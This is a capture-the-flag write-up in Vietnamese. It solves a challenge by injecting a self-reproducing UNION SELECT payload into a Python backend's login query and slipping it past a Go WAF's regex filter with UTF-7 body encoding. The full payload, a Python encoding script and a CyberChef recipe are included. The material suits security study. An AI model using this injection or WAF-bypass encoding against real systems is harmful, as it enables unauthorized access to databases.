Đây là môt challenge bao gồm 1 backend được viết bằng python và 1 proxy (waf) viết bằng go
![image](https://github.com/user-attachments/assets/ff5bde2d-b8dd-4fad-99b2-7b20a775b6d1)

Đọc qua source thì waf thực hiện xử lý request, filter payload sqli, rce sau đó gửi tới backend
![image](https://github.com/user-attachments/assets/41625d7a-21dc-4762-b2f0-8996468cfac5)

Trong source backend thì mình tìm bug sqli, thực hiện chèn trực tiếp các param username và password vào câu lệnh truy vấn rồi mới thực thi
![image](https://github.com/user-attachments/assets/0c279e41-a14b-4e3c-ae42-5c3698fb5a84)


Nhưng do username fix cứng là admin nên không thể inject được, bắt buộc phải inject vào password. Sau khi query, thực hiện so sánh password của bản ghi đầu tiên với password nhập vào. Điều này khiến cho việc chèn nhưng payload như `' or '1'='1'` là không khả thi. Sau một hồi gg thì mình tìm được một trick có thể giúp cho phép trả về nội dung của câu lệnh truy vấn. [Document](https://stackoverflow.com/questions/4006189/quine-self-producing-sql-query/4006209#4006209)

```
SELECT * FROM USERS WHERE username = 'admin' and password = '' union select 1, 'admin', (select replace(replace('" union select 1, "admin", (select replace(replace("$",char(34),char(39)),char(36),"$")) --',char(34),char(39)),char(36),'" union select 1, "admin", (select replace(replace("$",char(34),char(39)),char(36),"$")) --')) --
```
Giải thích qua  thì mình sẽ thực hiện lặp lại 2 lần câu lệnh truy vấn ở đầu và cuối (vị trí `$`).

Sau khi tạo được payload thử gửi thẳng tới backend, ở đây mình build docker local và curl thẳng vào container của backend. 
![image](https://github.com/user-attachments/assets/0d5b6928-f236-450c-9c93-571176675ef0)

Thành công exploit sqli

Tiếp theo là bypass waf. Thường thì có một số kỹ thuật bypass waf như là encode payload, nối hoặc ngắt câu lệnh bằng cách chèn comment. Với regex như trên thì chỉ có thể là encode payload. 

Ở đây mình sử dụng encode [utf-7](https://en.wikipedia.org/wiki/UTF-7) phần body bằng cách thêm `;charset=utf7`
Nhưng do gặp các ký tự thuộc bảng mã ascii thì vẫn được giữ nguyên nên mình có viết script để encode các ký tự này.

```py
import base64
def base64_encode_utf7(text):
    utf16_bytes = text.encode('utf-16be')
    base64_bytes = base64.b64encode(utf16_bytes)
    base64_str = base64_bytes.decode().replace("/", ",")
    return '+'+base64_str.rstrip("=")+'-'
```
Encode ký tự 's' và '-' để bypass regex `union select` và `--`

![image](https://github.com/user-attachments/assets/9d7e4bd6-af7e-43cd-9f7a-85d8b8caa7b2)

Thực hiện encode utf7 và replace. [ricipe](https://cyberchef.org/#recipe=Encode_text('UTF-7%20(65000)')Find_/_Replace(%7B'option':'Simple%20string','string':'select'%7D,'%2BAHM-elect',true,true,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'%2BACA---'%7D,'%2BACA-%2BAC0-%2BAC0-',true,false,true,false)&input=JyB1bmlvbiBzZWxlY3QgMSwgJ2FkbWluJywgKHNlbGVjdCByZXBsYWNlKHJlcGxhY2UoJyIgdW5pb24gc2VsZWN0IDEsICJhZG1pbiIsIChzZWxlY3QgcmVwbGFjZShyZXBsYWNlKCIkIixjaGFyKDM0KSxjaGFyKDM5KSksY2hhcigzNiksIiQiKSkgLS0nLGNoYXIoMzQpLGNoYXIoMzkpKSxjaGFyKDM2KSwnIiB1bmlvbiBzZWxlY3QgMSwgImFkbWluIiwgKHNlbGVjdCByZXBsYWNlKHJlcGxhY2UoIiQiLGNoYXIoMzQpLGNoYXIoMzkpKSxjaGFyKDM2KSwiJCIpKSAtLScpKSAtLQ)

![image](https://github.com/user-attachments/assets/de1e8ab4-3c4e-447d-9d01-e938eb107279)

![image](https://github.com/user-attachments/assets/fdbc7736-833f-407a-ae8f-26b2e42e4f45)




